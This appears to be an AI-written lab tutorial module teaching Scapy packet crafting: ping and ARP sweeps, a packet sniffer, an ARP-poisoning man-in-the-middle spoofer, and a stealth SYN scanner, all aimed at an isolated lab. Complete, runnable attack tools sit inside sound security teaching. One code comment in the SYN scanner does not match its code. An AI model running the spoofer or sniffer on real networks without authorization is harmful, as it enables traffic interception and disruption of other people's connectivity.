# Module 2: Advanced Packet Manipulation
### Building Custom Packet Injectors, ARP Spoofers, Ping Sweeps, and Sniffers with Scapy

---

## Module Overview

Module 1 used the `socket` library, which — like sending a letter through the post office — lets the operating system fill in all the "official" parts of the envelope for you (source IP, checksums, sequence numbers) while you just write the message inside. That's fast and safe, but it means you never actually see or control those official parts.

**Scapy** hands you the entire envelope, blank. You decide the source address, the flags, the checksums (or let Scapy calculate them), even whether the packet makes any real-world sense at all. This is a massive jump in power — and in responsibility. A tool that can *forge* packets is exactly the kind of tool that must never leave your isolated lab without written authorization.

We build this module in the same strict increments as Module 1:

1. Verify Scapy and understand *why* it needs elevated privileges
2. Craft and send your very first raw packet
3. Sweep an entire subnet for live hosts (ICMP)
4. Discover hosts more reliably using ARP
5. Build a live packet sniffer
6. Build an ARP spoofer (with a **mandatory** clean restoration mechanism)
7. Build a custom stealth SYN packet injector

**Every script targets only the `192.168.56.0/24` lab segment** authorized in `ROE.md`. Nothing here touches your home network — verify your interface before every single run.

---

## Step 1: Verifying Scapy and Understanding Raw Socket Privileges

### The Target
`scripts/module2/verify_scapy_privileges.py` — a script confirming Scapy can construct and transmit raw packets on your machine, and confirming *why* it needs `sudo`/Administrator rights to do so.

### The Concept
A normal `socket` connection is like handing a sealed letter to the post office — they write the correct return address and stamp it for you, and you're physically incapable of writing a fake one. A **raw socket** is like being handed a blank envelope and a rubber stamp kit and being told "write whatever you want on this, including the return address." That's an enormous amount of trust, because a malicious program with that power could impersonate any machine on the network. For this exact reason, every major operating system kernel restricts raw socket creation to privileged accounts — root on Linux/macOS, Administrator on Windows (via a special driver called **Npcap**). Scapy doesn't bypass this restriction; it *requires* it, which is why every script in this module must be run with elevated privileges.

### The Implementation

```bash
mkdir -p pentest-lab/scripts/module2
```

**`scripts/module2/verify_scapy_privileges.py`**
```python
"""
verify_scapy_privileges.py
Confirms Scapy is installed correctly and that this process has the
raw-socket privileges required for every other script in this module.

Run WITHOUT sudo first to see the expected failure, then WITH sudo
to see it succeed. This contrast is the point of this script.
"""

import os
import sys

from scapy.all import IP, ICMP, get_if_list, conf


def confirm_root_privileges() -> None:
    """
    Raw socket creation requires elevated OS privileges. We check this
    explicitly and fail with a clear message rather than letting Scapy
    raise a cryptic PermissionError deep in its internals.
    """
    # os.geteuid() only exists on POSIX systems (Linux/macOS) — Windows
    # uses a different privilege model (Administrator + Npcap driver)
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print("[FAIL] This script must be run with root privileges.")
        print("        Try: sudo .venv/bin/python3 scripts/module2/verify_scapy_privileges.py")
        sys.exit(1)
    print("[OK] Running with root/administrator privileges.")


def list_available_interfaces() -> None:
    """
    Prints every network interface Scapy can see. You'll need the exact
    name of your host-only adapter (e.g., 'vboxnet0', 'enp0s8') for
    every script from this point forward.
    """
    print("\nAvailable network interfaces:")
    for iface_name in get_if_list():
        marker = " <-- current default" if iface_name == conf.iface else ""
        print(f"  - {iface_name}{marker}")


def send_test_packet() -> None:
    """
    Constructs a minimal ICMP echo request (a 'ping') and attempts to
    send it. This is the actual proof that raw socket access works —
    everything above this was just informational.
    """
    try:
        # IP(...)/ICMP() stacks two protocol layers using Scapy's '/'
        # operator — read this as "an ICMP message, wrapped inside an
        # IP packet, wrapped inside whatever Ethernet frame is needed"
        test_packet = IP(dst="192.168.56.1") / ICMP()

        # verbose=0 suppresses Scapy's own console output so we control
        # exactly what gets printed
        from scapy.all import sr1
        response = sr1(test_packet, timeout=2, verbose=0)

        if response is not None:
            print("\n[OK] Raw packet sent and a response was received.")
            print("     Scapy has full raw socket access on this system.")
        else:
            print("\n[OK] Raw packet sent successfully (no reply received, "
                  "which is fine — this only confirms SENDING works).")

    except PermissionError:
        print("\n[FAIL] Permission denied while sending a raw packet.")
        print("        This confirms raw sockets require elevated privileges.")
        sys.exit(1)
    except OSError as err:
        print(f"\n[FAIL] OS-level error while sending: {err}")
        sys.exit(1)


if __name__ == "__main__":
    confirm_root_privileges()
    list_available_interfaces()
    send_test_packet()
```

### The Verification

**First, run it without elevated privileges** to see the expected, honest failure:
```bash
cd pentest-lab
python3 scripts/module2/verify_scapy_privileges.py
```
**Expected output:**
```
[FAIL] This script must be run with root privileges.
        Try: sudo .venv/bin/python3 scripts/module2/verify_scapy_privileges.py
```

**Now run it correctly, with sudo**, pointing directly at your venv's Python interpreter (using plain `sudo python3` can silently fall back to your *system* Python, which won't have Scapy installed):
```bash
sudo .venv/bin/python3 scripts/module2/verify_scapy_privileges.py
```
**Expected output:**
```
[OK] Running with root/administrator privileges.

Available network interfaces:
  - lo
  - enp0s3
  - vboxnet0 <-- current default
[OK] Raw packet sent successfully (no reply received, which is fine — this only confirms SENDING works).
```

**Write down your host-only interface name** (`vboxnet0` in the example above, but yours may differ) — you'll pass it explicitly to every remaining script in this module.

---

## Step 2: Crafting and Sending Your First Raw Packet

### The Target
`scripts/module2/first_packet.py` — manually build an IP/ICMP packet layer-by-layer and send it to a single host, examining the reply.

### The Concept
Think of a network packet like a **Russian nesting doll**. The outermost doll is the Ethernet frame (Layer 2 — "which physical device on this wire should receive this?"). Inside that is the IP packet (Layer 3 — "which machine on the wider network is this ultimately for?"). Inside that is the actual message — in this case, an ICMP echo request (Layer 4-ish — "please reply so I know you're alive"). Scapy's `/` operator is how you nest these dolls inside each other in code, and it reads almost like plain English: `IP(dst=X)/ICMP()` means "an ICMP message, addressed via IP to X."

### The Implementation

**`scripts/module2/first_packet.py`**
```python
"""
first_packet.py
Manually builds a layered IP/ICMP packet and sends it to one host,
inspecting the raw layers of both the request and the reply.

Must be run with sudo. Target must be in ROE.md scope.
"""

import sys

from scapy.all import IP, ICMP, sr1

TARGET_HOST = "192.168.56.101"   # Metasploitable2, per ROE.md
TIMEOUT_SECONDS = 3


def build_icmp_echo_request(destination: str) -> IP:
    """
    Builds a single ICMP echo request packet.
    Scapy fills in fields we don't specify (like the source IP and
    checksums) using sensible defaults — we only override what we
    actually care about.
    """
    # IP layer: destination address. Scapy auto-detects the correct
    # source IP and outbound interface based on your routing table.
    ip_layer = IP(dst=destination)

    # ICMP layer: type=8 is "echo request" (a ping) by default when
    # you construct ICMP() with no arguments — this is the standard
    # "are you alive?" message.
    icmp_layer = ICMP()

    # The '/' operator stacks layers: ICMP payload inside an IP packet
    return ip_layer / icmp_layer


def send_and_inspect(packet: IP, timeout: float) -> None:
    """Sends the packet and prints a full breakdown of both directions."""
    print("--- Outbound Packet Structure ---")
    packet.show()   # Scapy's built-in layer-by-layer pretty-printer

    try:
        # sr1 = "send and receive 1 answer" — sends the packet and
        # blocks until either a matching reply arrives or timeout hits
        reply = sr1(packet, timeout=timeout, verbose=0)
    except PermissionError:
        print("[FAIL] Permission denied — this script requires sudo.")
        sys.exit(1)
    except OSError as err:
        print(f"[FAIL] Network error while sending: {err}")
        sys.exit(1)

    if reply is None:
        print("\n[INFO] No reply received within timeout. "
              "Host may be down, or silently filtering ICMP.")
        return

    print("\n--- Inbound Reply Structure ---")
    reply.show()

    # reply[ICMP].type == 0 means "echo reply" — the successful response
    if reply.haslayer(ICMP) and reply[ICMP].type == 0:
        print(f"\n[OK] {TARGET_HOST} is alive and responded to our ping.")


if __name__ == "__main__":
    echo_request = build_icmp_echo_request(TARGET_HOST)
    send_and_inspect(echo_request, TIMEOUT_SECONDS)
```

### The Verification

```bash
sudo .venv/bin/python3 scripts/module2/first_packet.py
```

**Expected output (abbreviated — `.show()` prints many fields):**
```
--- Outbound Packet Structure ---
###[ IP ]###
  version   = 4
  ...
  dst       = 192.168.56.101
###[ ICMP ]###
     type      = echo-request
     code      = 0
     ...

--- Inbound Reply Structure ---
###[ IP ]###
  ...
  src       = 192.168.56.101
###[ ICMP ]###
     type      = echo-reply
     code      = 0
     ...

[OK] 192.168.56.101 is alive and responded to our ping.
```

The critical thing to notice: **you never specified a source IP address, a checksum, or a packet ID** — Scapy calculated all of it. In Step 7, we'll start overriding more of these fields deliberately, and it's important you've seen the "auto-filled, honest" version first.

---

## Step 3: ICMP Ping Sweep Across the Subnet

### The Target
`scripts/module2/ping_sweep.py` — discover every live host across the entire `192.168.56.0/24` lab subnet using a single Scapy command.

### The Concept
In Module 1, checking many targets meant manually building a thread pool. Scapy has this batching capability **built in**: if you give a field like `dst` a network range instead of a single address, Scapy automatically expands it into one packet per host in that range and sends them as a batch. It's like addressing one envelope to "Every Resident, Maple Street" and having the postal service automatically photocopy it and deliver a copy to every house — you write the address pattern once, Scapy does the fan-out.

### The Implementation

**`scripts/module2/ping_sweep.py`**
```python
"""
ping_sweep.py
Sweeps an entire subnet with ICMP echo requests to find live hosts,
using Scapy's built-in network-range expansion.

Must be run with sudo. Target subnet must match ROE.md scope exactly.
"""

import sys

from scapy.all import IP, ICMP, sr

TARGET_SUBNET = "192.168.56.0/24"   # Must match ROE.md — do not widen this
TIMEOUT_SECONDS = 2


def sweep_subnet(subnet: str, timeout: float) -> list[str]:
    """
    Sends one ICMP echo request to every host in the given subnet and
    returns the list of IPs that replied.
    """
    # Passing a CIDR range as 'dst' makes Scapy silently expand this
    # single IP object into 254 individual packets (for a /24) —
    # this is a core Scapy feature, not a custom loop we wrote.
    sweep_packet = IP(dst=subnet) / ICMP()

    try:
        # sr() (not sr1) is built for MANY packets: it returns a tuple of
        # (answered, unanswered) — answered is a list of (sent, received)
        # packet pairs; unanswered is every packet that got no reply.
        answered, unanswered = sr(sweep_packet, timeout=timeout, verbose=0)
    except PermissionError:
        print("[FAIL] Permission denied — this script requires sudo.")
        sys.exit(1)
    except OSError as err:
        print(f"[FAIL] Network error during sweep: {err}")
        sys.exit(1)

    live_hosts = []
    for sent_packet, received_packet in answered:
        live_hosts.append(received_packet.src)

    print(f"\n[INFO] {len(unanswered)} host(s) did not respond "
          f"(down, or silently filtering ICMP — not necessarily offline).")

    return sorted(live_hosts, key=lambda ip: tuple(int(part) for part in ip.split(".")))


if __name__ == "__main__":
    print(f"Sweeping {TARGET_SUBNET} for live hosts (ICMP)...\n")
    hosts = sweep_subnet(TARGET_SUBNET, TIMEOUT_SECONDS)

    print("\n--- Live Hosts (responded to ICMP) ---")
    if hosts:
        for host_ip in hosts:
            print(f"  {host_ip}")
    else:
        print("  None found.")
```

### The Verification

```bash
sudo .venv/bin/python3 scripts/module2/ping_sweep.py
```

**Expected output:**
```
Sweeping 192.168.56.0/24 for live hosts (ICMP)...

[INFO] 252 host(s) did not respond (down, or silently filtering ICMP — not necessarily offline).

--- Live Hosts (responded to ICMP) ---
  192.168.56.1
  192.168.56.101
```

You should see your host machine's own host-only IP (`192.168.56.1`) and Metasploitable2 (`192.168.56.101`). **A crucial limitation to internalize here:** if a host on your network has a firewall silently dropping ICMP (extremely common in real corporate networks and even some hardened lab boxes), it will appear "dead" in this sweep even though it's fully alive and reachable over TCP. That exact gap is what Step 4 solves.

---

## Step 4: Reliable Host Discovery with ARP

### The Target
`scripts/module2/arp_scanner.py` — discover live hosts on the local subnet using ARP requests instead of ICMP.

### The Concept
**ARP (Address Resolution Protocol)** is how devices on the *same physical network* find each other's hardware (MAC) address — it's a mandatory, foundational part of how Ethernet networking functions at all, which means it **cannot be firewalled off** without breaking the network entirely. Think of ICMP as politely knocking and asking "are you home?" — a homeowner can choose to ignore that knock. ARP is more like the mail carrier asking "which physical mailbox number belongs to this address?" — every house on the street is *required* to answer, or literally no mail can ever be delivered to it. This is why ARP scanning is dramatically more reliable than ICMP sweeping for discovering hosts on your local subnet — and exactly why it's also the technique behind the ARP spoofing tool in Step 6.

### The Implementation

**`scripts/module2/arp_scanner.py`**
```python
"""
arp_scanner.py
Discovers live hosts on the local subnet using ARP requests, which
cannot be silently firewalled the way ICMP can.

Must be run with sudo. Target subnet must match ROE.md scope exactly.
"""

import sys

from scapy.all import ARP, Ether, srp

TARGET_SUBNET = "192.168.56.0/24"   # Must match ROE.md
TIMEOUT_SECONDS = 3


def arp_scan(subnet: str, timeout: float) -> list[dict]:
    """
    Broadcasts an ARP 'who-has' request for every IP in the subnet and
    collects the (IP, MAC) pairs of every host that answers.
    """
    # ARP layer: pdst (protocol destination) accepts a CIDR range and
    # expands it, just like IP(dst=...) did in Step 3.
    arp_request = ARP(pdst=subnet)

    # Ether layer: ARP operates at Layer 2, so it needs an Ethernet
    # frame wrapper. 'ff:ff:ff:ff:ff:ff' is the broadcast MAC address —
    # every device on the physical segment receives and inspects this frame.
    broadcast_frame = Ether(dst="ff:ff:ff:ff:ff:ff")

    # Stack the ARP request inside the broadcast Ethernet frame
    full_packet = broadcast_frame / arp_request

    try:
        # srp() is like sr() but operates at Layer 2 (hence the extra 'p'
        # for "packet", meaning it includes the Ethernet layer). We only
        # care about answered results here — index [0] of the returned tuple.
        answered_list = srp(full_packet, timeout=timeout, verbose=0)[0]
    except PermissionError:
        print("[FAIL] Permission denied — this script requires sudo.")
        sys.exit(1)
    except OSError as err:
        print(f"[FAIL] Network error during ARP scan: {err}")
        sys.exit(1)

    discovered_hosts = []
    for sent_packet, received_packet in answered_list:
        discovered_hosts.append({
            "ip": received_packet.psrc,     # ARP "sender protocol address" = their IP
            "mac": received_packet.hwsrc,   # ARP "sender hardware address" = their MAC
        })

    return sorted(discovered_hosts,
                  key=lambda h: tuple(int(part) for part in h["ip"].split(".")))


if __name__ == "__main__":
    print(f"ARP scanning {TARGET_SUBNET} for live hosts...\n")
    hosts = arp_scan(TARGET_SUBNET, TIMEOUT_SECONDS)

    print(f"{'IP Address':<18}{'MAC Address'}")
    print("-" * 40)
    for host in hosts:
        print(f"{host['ip']:<18}{host['mac']}")

    print(f"\n[INFO] {len(hosts)} host(s) discovered.")
```

### The Verification

```bash
sudo .venv/bin/python3 scripts/module2/arp_scanner.py
```

**Expected output:**
```
ARP scanning 192.168.56.0/24 for live hosts...

IP Address        MAC Address
----------------------------------------
192.168.56.1      0a:00:27:00:00:00
192.168.56.101    08:00:27:4f:8c:2e

[INFO] 2 host(s) discovered.
```

Note that this returned exactly the same hosts as the ICMP sweep in our lab — because Metasploitable2 doesn't happen to firewall ICMP. **Try this yourself as an experiment:** if you have any other machine with `ufw`/`iptables` configured to drop ICMP, add it to your host-only network temporarily and compare — the ARP scan will still find it while the ICMP sweep in Step 3 misses it entirely.

---

## Step 5: Building a Live Packet Sniffer

### The Target
`scripts/module2/packet_sniffer.py` — capture and display live traffic on the wire in real time.

### The Concept
Everything we've done so far has been us *sending* packets and waiting for a direct reply. A **sniffer** is fundamentally different — it's eavesdropping. Imagine standing in a room where everyone is having conversations and simply writing down everything you overhear, without saying a word yourself. Ethernet networks historically broadcast more traffic than you'd expect onto the shared wire (especially on hubs, and even switches under certain conditions like ARP spoofing — which is exactly why Step 6 pairs so naturally with this sniffer). Scapy's `sniff()` function puts your network interface into a mode where it hands your Python process a copy of every packet it sees, which you can then filter and inspect.

### The Implementation

**`scripts/module2/packet_sniffer.py`**
```python
"""
packet_sniffer.py
A live packet sniffer with a Berkeley Packet Filter (BPF) expression
to narrow down exactly which traffic we capture.

Must be run with sudo. Only run this on your isolated lab interface.
"""

import argparse
import sys

from scapy.all import sniff, ARP, ICMP, IP, TCP, Raw


def describe_packet(packet) -> str:
    """
    Builds a short, human-readable one-line summary of a captured packet.
    We check layers from most-specific to least-specific, since a packet
    can technically match multiple 'haslayer' checks.
    """
    if packet.haslayer(ARP):
        arp_layer = packet[ARP]
        # op=1 is a request ("who has this IP?"), op=2 is a reply ("I do")
        op_description = "request" if arp_layer.op == 1 else "reply"
        return (f"ARP {op_description}: {arp_layer.psrc} -> {arp_layer.pdst} "
                f"(hwsrc={arp_layer.hwsrc})")

    if packet.haslayer(ICMP) and packet.haslayer(IP):
        icmp_layer = packet[ICMP]
        ip_layer = packet[IP]
        icmp_type = "echo-request" if icmp_layer.type == 8 else \
                    "echo-reply" if icmp_layer.type == 0 else str(icmp_layer.type)
        return f"ICMP {icmp_type}: {ip_layer.src} -> {ip_layer.dst}"

    if packet.haslayer(TCP) and packet.haslayer(IP):
        ip_layer = packet[IP]
        tcp_layer = packet[TCP]
        flags = str(tcp_layer.flags)   # e.g. 'S' (SYN), 'SA' (SYN-ACK), 'PA' (PSH-ACK)
        payload_note = ""
        if packet.haslayer(Raw):
            # Only show a short preview — full payloads can be huge/binary
            raw_bytes = bytes(packet[Raw].load)[:40]
            payload_note = f" payload={raw_bytes!r}"
        return (f"TCP [{flags}]: {ip_layer.src}:{tcp_layer.sport} -> "
                f"{ip_layer.dst}:{tcp_layer.dport}{payload_note}")

    return f"Other packet: {packet.summary()}"


def handle_packet(packet) -> None:
    """Callback invoked by sniff() for every captured packet."""
    try:
        print(describe_packet(packet))
    except Exception as err:
        # A malformed or unusual packet should never crash a long-running
        # sniffer — log it and keep capturing.
        print(f"[WARN] Could not parse a packet: {err}")


def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Live packet sniffer for the lab network. "
                    "FOR AUTHORIZED LAB USE ONLY."
    )
    parser.add_argument("--iface", required=True,
                         help="Network interface to sniff on (e.g., vboxnet0)")
    parser.add_argument("--filter", default="arp or icmp or tcp",
                         help="BPF filter expression (default: 'arp or icmp or tcp')")
    parser.add_argument("--count", type=int, default=0,
                         help="Number of packets to capture (0 = unlimited, Ctrl+C to stop)")
    return parser


if __name__ == "__main__":
    args = build_arg_parser().parse_args()

    print(f"Sniffing on interface '{args.iface}' with filter '{args.filter}'")
    print("Press Ctrl+C to stop.\n")

    try:
        # filter= uses BPF syntax (the same filter language tcpdump uses) —
        # this filtering happens in the KERNEL before packets even reach
        # Python, which is far more efficient than filtering in our callback.
        # store=False prevents Scapy from keeping every packet in memory,
        # which matters a lot on long-running captures.
        sniff(iface=args.iface, filter=args.filter, prn=handle_packet,
              store=False, count=args.count)
    except PermissionError:
        print("[FAIL] Permission denied — this script requires sudo.")
        sys.exit(1)
    except OSError as err:
        print(f"[FAIL] Could not sniff on interface '{args.iface}': {err}")
        print("        Double-check the interface name from Step 1's verification.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[INFO] Sniffing stopped by user.")
```

### The Verification

In one terminal, start the sniffer (replace `vboxnet0` with your actual interface name from Step 1):
```bash
sudo .venv/bin/python3 scripts/module2/packet_sniffer.py --iface vboxnet0
```

In a **second terminal**, generate some traffic to observe:
```bash
ping -c 3 192.168.56.101
```

**Expected output in the sniffer's terminal:**
```
Sniffing on interface 'vboxnet0' with filter 'arp or icmp or tcp'
Press Ctrl+C to stop.

ICMP echo-request: 192.168.56.1 -> 192.168.56.101
ICMP echo-reply: 192.168.56.101 -> 192.168.56.1
ICMP echo-request: 192.168.56.1 -> 192.168.56.101
ICMP echo-reply: 192.168.56.101 -> 192.168.56.1
ICMP echo-request: 192.168.56.1 -> 192.168.56.101
ICMP echo-reply: 192.168.56.101 -> 192.168.56.1
```

Press `Ctrl+C` to stop cleanly. Then try re-running Module 1's `pyscan.py` against Metasploitable2 in the second terminal while the sniffer runs — you should see a flurry of `TCP [S]` (your scanner's SYN packets) and `TCP [SA]` (open port replies) lines, which is a genuinely satisfying way to *see* your own Module 1 tool's traffic on the wire for the first time.

---

## Step 6: ARP Spoofing — Man-in-the-Middle Positioning

> ⚠️ **This is the most powerful — and most dangerous — tool in this module.** ARP spoofing corrupts another device's understanding of the network. Run this **only** against `192.168.56.101` (Metasploitable2) with the target and gateway both inside your isolated host-only network. Never run this against your home router, roommate's laptop, or any device not explicitly listed in `ROE.md`. We build in a **mandatory automatic restoration mechanism** specifically so you never leave a target's ARP table corrupted.

### The Target
`scripts/module2/arp_spoofer.py` — continuously poison the ARP cache of a target machine and the network gateway, positioning your machine as a man-in-the-middle, with guaranteed cleanup on exit.

### The Concept
Every device on a LAN keeps a small internal notebook (the **ARP cache**) mapping IP addresses to MAC addresses, so it doesn't have to ask "who has this IP?" every single time it sends a packet. ARP spoofing works by repeatedly sending that device an *unsolicited* ARP reply — like slipping a forged note into their notebook that says "the gateway's MAC address is actually **mine**." The victim believes the note (ARP has no built-in authentication — this is a known, structural protocol weakness, not a bug) and starts sending all its gateway-bound traffic to your machine instead. You can then optionally forward that traffic onward, but critically, **you must reverse this poisoning when you're done** — otherwise the victim's real network connectivity stays broken.

### The Implementation

**`scripts/module2/arp_spoofer.py`**
```python
"""
arp_spoofer.py
Performs ARP cache poisoning to position this machine as a
man-in-the-middle between a target and the gateway.

Includes a mandatory, guaranteed ARP-table restoration on exit —
never comment this out. FOR AUTHORIZED LAB USE ONLY.
"""

import argparse
import sys
import time

from scapy.all import ARP, Ether, send, getmacbyip


def get_mac(ip_address: str) -> str:
    """
    Resolves the MAC address for a given IP using Scapy's built-in
    ARP resolution helper. Raises a clear error if resolution fails,
    since every subsequent step depends on having real MAC addresses.
    """
    mac = getmacbyip(ip_address)
    if mac is None:
        raise RuntimeError(
            f"Could not resolve MAC address for {ip_address}. "
            "Is the host powered on and reachable? (Try arp_scanner.py first.)"
        )
    return mac


def spoof(target_ip: str, target_mac: str, impersonate_ip: str) -> None:
    """
    Sends a single forged ARP reply to target_ip, claiming that
    impersonate_ip's MAC address is OUR machine's MAC address.

    We don't set the source MAC explicitly — Scapy fills it in with
    our real network card's MAC automatically, which is exactly the
    behavior we want (the victim needs to record OUR real MAC).
    """
    spoofed_packet = ARP(
        op=2,                      # op=2 is "is-at" (an ARP REPLY, unsolicited here)
        pdst=target_ip,            # who we're sending this forged reply TO
        hwdst=target_mac,          # their MAC, so this reaches them directly (not broadcast)
        psrc=impersonate_ip,       # the IP we're LYING about owning
    )
    # verbose=0 keeps the console clean during continuous spoofing
    send(spoofed_packet, verbose=0)


def restore(target_ip: str, target_mac: str, real_ip: str, real_mac: str) -> None:
    """
    Sends the TRUE mapping to undo our spoofing — this is the ethical
    and technical cleanup step that must always run before this script exits.
    """
    correction_packet = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=real_ip,
        hwsrc=real_mac,   # explicitly set here to guarantee correctness on restore
    )
    # count=5 sends it several times, since UDP-like unreliable delivery
    # means a single restoration packet could be missed
    send(correction_packet, count=5, verbose=0)


def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="ARP spoofer for authorized MITM lab testing. "
                    "FOR AUTHORIZED LAB USE ONLY — see ROE.md."
    )
    parser.add_argument("--target", required=True,
                         help="Victim IP address (e.g., 192.168.56.101)")
    parser.add_argument("--gateway", required=True,
                         help="Gateway/router IP address to impersonate")
    parser.add_argument("--interval", type=float, default=2.0,
                         help="Seconds between spoofed packets (default: 2.0)")
    return parser


if __name__ == "__main__":
    args = build_arg_parser().parse_args()

    print("=" * 60)
    print("ARP SPOOFER — AUTHORIZED LAB USE ONLY")
    print(f"Target:  {args.target}")
    print(f"Gateway: {args.gateway}")
    print("=" * 60)

    try:
        target_mac = get_mac(args.target)
        gateway_mac = get_mac(args.gateway)
        print(f"[OK] Resolved {args.target} -> {target_mac}")
        print(f"[OK] Resolved {args.gateway} -> {gateway_mac}")
    except RuntimeError as err:
        print(f"[FAIL] {err}")
        sys.exit(1)

    packets_sent = 0
    try:
        print("\nSpoofing started. Press Ctrl+C to stop and restore ARP tables.\n")
        while True:
            # Lie to the TARGET: "I am the gateway"
            spoof(args.target, target_mac, args.gateway)
            # Lie to the GATEWAY: "I am the target" (needed for full bidirectional MITM)
            spoof(args.gateway, gateway_mac, args.target)

            packets_sent += 2
            print(f"\r[INFO] Spoofed packets sent: {packets_sent}", end="", flush=True)
            time.sleep(args.interval)

    except KeyboardInterrupt:
        # This block is NOT optional — it is the ethical core of this script.
        print("\n\n[INFO] Stopping — restoring real ARP mappings now...")

    except PermissionError:
        print("\n[FAIL] Permission denied — this script requires sudo.")
        sys.exit(1)

    finally:
        # 'finally' guarantees this runs even if something above raised an
        # unexpected exception — we NEVER want to exit leaving the target poisoned.
        try:
            restore(args.target, target_mac, args.gateway, gateway_mac)
            restore(args.gateway, gateway_mac, args.target, target_mac)
            print("[OK] ARP tables restored. Target and gateway should have "
                  "correct mappings again.")
        except Exception as err:
            print(f"[WARN] Restoration may have failed: {err}")
            print("        Manually verify the target's ARP table, or reboot it.")
```

### The Verification

On the **Metasploitable2 VM itself** (log in with `msfadmin`/`msfadmin`), check its current ARP table *before* spoofing:
```bash
arp -n
```
Note the MAC address listed for your gateway (`192.168.56.1`).

Back on your **host machine**, start the spoofer:
```bash
sudo .venv/bin/python3 scripts/module2/arp_spoofer.py --target 192.168.56.101 --gateway 192.168.56.1
```
**Expected output:**
```
============================================================
ARP SPOOFER — AUTHORIZED LAB USE ONLY
Target:  192.168.56.101
Gateway: 192.168.56.1
============================================================
[OK] Resolved 192.168.56.101 -> 08:00:27:4f:8c:2e
[OK] Resolved 192.168.56.1 -> 0a:00:27:00:00:00

Spoofing started. Press Ctrl+C to stop and restore ARP tables.

[INFO] Spoofed packets sent: 24
```

Back on the **Metasploitable2 VM**, re-check its ARP table while spoofing is running:
```bash
arp -n
```
**You should now see your host machine's real MAC address listed next to the gateway's IP** — proof the poisoning worked.

Now press `Ctrl+C` on your host machine's spoofer terminal:
```
[INFO] Stopping — restoring real ARP mappings now...
[OK] ARP tables restored. Target and gateway should have correct mappings again.
```

Immediately re-check the ARP table on Metasploitable2 one final time — **the gateway's original, correct MAC address should be back.** This final check is not optional; it's how you confirm the restoration logic genuinely worked and you haven't left the lab machine in a broken state.

---

## Step 7: Custom Packet Injection — A Stealth SYN Scanner

### The Target
`scripts/module2/stealth_syn_scan.py` — a port scanner that inspects a single raw TCP flag on the reply, contrasted directly against Module 1's full-connection scanner.

### The Concept
Recall Module 1's scanner: it completed a **full** TCP three-way handshake on every port (`SYN` → `SYN-ACK` → `ACK`), which gets logged by the target's OS as a fully-established connection. A **stealth SYN scan** (also called a "half-open scan") sends only the first `SYN` packet, inspects the reply, and then — if the port is open — immediately sends a `RST` (reset) instead of completing the handshake. It's the difference between fully walking through a door and shaking someone's hand (logged, memorable) versus knocking, peeking through the gap when it opens, and immediately stepping back before anyone gets a good look (much less likely to be logged as a real connection attempt). We can only send that solitary crafted `SYN` packet because Scapy grants us the raw control Module 1's `socket` library deliberately abstracted away.

### The Implementation

**`scripts/module2/stealth_syn_scan.py`**
```python
"""
stealth_syn_scan.py
A half-open (stealth) SYN scanner built with raw packet crafting,
contrasted against Module 1's full-connect socket scanner.

Must be run with sudo. FOR AUTHORIZED LAB USE ONLY.
"""

import argparse
import sys

from scapy.all import IP, TCP, sr1, send


def scan_port(host: str, port: int, timeout: float) -> str:
    """
    Sends a single raw SYN packet and interprets the TCP flags of the
    reply to determine port state, tearing down cleanly without
    completing the handshake.
    """
    # sport is chosen semi-randomly by Scapy by default if omitted;
    # we specify a fixed high source port here purely for readability
    # in the accompanying sniffer output during verification.
    syn_packet = IP(dst=host) / TCP(dport=port, flags="S")

    try:
        # sr1: send one packet, wait for exactly one matching reply
        reply = sr1(syn_packet, timeout=timeout, verbose=0)
    except PermissionError:
        raise
    except OSError as err:
        return f"error ({err})"

    if reply is None:
        # No reply at all: a firewall likely dropped our SYN silently
        return "filtered"

    if reply.haslayer(TCP):
        tcp_flags = reply[TCP].flags

        # Flag value 0x12 = SYN+ACK (0x02 | 0x10) -> port is OPEN
        if tcp_flags == 0x12:
            # CRITICAL: we must tear down the half-open connection we
            # triggered on the target's OS, or we leave it waiting on
            # a handshake that will never complete. Sending RST (flags="R")
            # cleanly cancels it, and 'send' (fire-and-forget, no reply expected)
            # is correct here since we don't need or want a response to our RST.
            rst_packet = IP(dst=host) / TCP(dport=port, flags="R", seq=reply[TCP].ack)
            send(rst_packet, verbose=0)
            return "open"

        # Flag value 0x14 = RST+ACK (0x04 | 0x10) -> port is CLOSED
        if tcp_flags == 0x14:
            return "closed"

    return "unexpected response"


def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Stealth (half-open) SYN scanner. FOR AUTHORIZED LAB USE ONLY."
    )
    parser.add_argument("--host", required=True, help="Target IP (must match ROE.md scope)")
    parser.add_argument("--ports", required=True,
                         help="Comma-separated ports, e.g. '21,22,23,80,445'")
    parser.add_argument("--timeout", type=float, default=2.0,
                         help="Per-port timeout in seconds (default: 2.0)")
    return parser


if __name__ == "__main__":
    args = build_arg_parser().parse_args()

    try:
        ports = [int(p.strip()) for p in args.ports.split(",")]
    except ValueError:
        print(f"[ERROR] Invalid --ports value: '{args.ports}'")
        sys.exit(1)

    print(f"Stealth SYN scanning {args.host} on {len(ports)} port(s)...\n")

    try:
        for port in ports:
            state = scan_port(args.host, port, args.timeout)
            print(f"  {port:>5}/tcp  {state}")
    except PermissionError:
        print("[FAIL] Permission denied — this script requires sudo.")
        sys.exit(1)
```

### The Verification

```bash
sudo .venv/bin/python3 scripts/module2/stealth_syn_scan.py --host 192.168.56.101 --ports 21,22,23,80,9999
```

**Expected output:**
```
Stealth SYN scanning 192.168.56.101 on 5 port(s)...

     21/tcp  open
     22/tcp  open
     23/tcp  open
     80/tcp  open
   9999/tcp  closed
```

**To see the actual "stealth" behavior with your own eyes**, run Step 5's sniffer in a second terminal filtered to just TCP (`--filter "tcp"`) while this scan runs. Watch closely: for each open port you'll see exactly **three** packets — our `SYN`, the target's `SYN-ACK`, and our immediate `RST` — and **never** the final `ACK` that Module 1's `pyscan.py` would have sent to complete a full connection. Then re-run Module 1's scanner against the same ports with the sniffer still attached, and count four packets per open port instead of three. That side-by-side packet count is the entire concept of this step, made visible.

---

Module 2 complete. Whenever you're ready, request the next module or a specific appendix (A, B, or C) and I'll expand it standalone.
